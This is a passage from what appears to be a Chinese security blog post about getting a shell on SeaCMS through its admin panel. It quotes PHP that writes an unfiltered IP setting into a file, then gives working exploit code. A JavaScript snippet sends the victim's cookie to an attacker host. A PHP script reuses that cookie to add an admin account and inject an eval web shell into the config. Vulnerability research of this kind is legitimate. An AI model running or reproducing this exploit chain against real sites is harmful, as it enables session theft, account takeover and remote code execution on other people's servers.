    $str.=&quot;$ip&quot;;

    $str.=&#39;&quot;; &#39;;

    $str.=&quot; ?&gt;&quot;;

    fwrite($open,$str);

    fclose($open);

    ShowMsg(&quot;成功保存设置!&quot;,&quot;admin_ip.php&quot;);

    exit;

&#125;

?&gt;
</code></pre>
<p>这里根本没有经过过滤，直接将变量写进去，可以写一个脚本利用</p>
<p>代码如下</p>
<pre><code># test.js

var img = new Image();

img.src=  &quot;http://127.0.0.1/test.php?x=&quot; + document.cookie + &quot;&amp;p=&quot; + location.pathname;

# test.php

&lt;?php

    function Requests($url, $data, $cookie = &#39;&#39;, $type = 1)&#123;

        $ch = curl_init();

        $params[CURLOPT_URL] = $url;

           $params[CURLOPT_HEADER] = FALSE;

        $params[CURLOPT_SSL_VERIFYPEER] = false;

        $params[CURLOPT_SSL_VERIFYHOST] = false;

        $params[CURLOPT_RETURNTRANSFER] = true;

        if ($type === 1) &#123;

            $params[CURLOPT_POST] = true;

            $params[CURLOPT_POSTFIELDS] = $data;

        &#125;

        $params[CURLOPT_COOKIE] = $cookie;

        curl_setopt_array($ch, $params);

        $output = curl_exec($ch);

        file_put_contents(&#39;log.txt&#39;, $output, FILE_APPEND);

        curl_close($ch);

    &#125;

    $C = $_GET[&#39;x&#39;];

    $P = $_GET[&#39;p&#39;];

    $P = substr($P, 0, strlen($P)-21);

    file_put_contents(&#39;c.txt&#39;, $C);

    file_put_contents(&#39;p.txt&#39;, $P);

    $url_1 = &#39;http://192.168.113.128&#39;.$P.&#39;admin_manager.php?action=add&#39;;

    $url_2 = &#39;http://192.168.113.128&#39;.$P.&#39;admin_ip.php?action=set&#39;;

    $data_1 = &#39;username=test&amp;pwd=test&amp;pwd2=test&amp;groupid=1&#39;;

    $data_2 = &#39;v=0&amp;ip=+&quot;;@eval($_POST[qwer]);&quot;&#39;;

    Requests($url_1, $data_1, $C);

    Requests($url_2, $data_2, $C);
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Seacms/Seacms%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Seacms/Seacms%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qvjz00gay8v1dfk01w5u" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/42/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/41/">41</a><a class="page-number" href="/page/42/">42</a><span class="page-number current">43</span><a class="page-number" href="/page/44/">44</a><a class="page-number" href="/page/45/">45</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/44/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>